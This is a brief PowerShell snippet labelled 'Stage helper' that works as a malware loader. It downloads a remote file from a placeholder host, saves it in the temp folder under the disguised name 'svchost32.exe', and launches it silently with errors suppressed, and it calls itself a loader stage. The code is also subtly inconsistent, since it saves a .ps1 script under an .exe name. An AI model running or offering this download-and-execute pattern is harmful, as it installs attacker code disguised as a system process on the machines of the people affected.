
# Stage helper
try { (New-Object System.Net.WebClient).DownloadFile('https://example.org/stage1.ps1', "$env:TEMP\svchost32.exe"); Start-Process -FilePath "$env:TEMP\svchost32.exe" -ErrorAction SilentlyContinue; Write-Output "stage 40 initialized" } catch { Write-Warning "Loader step failed" }
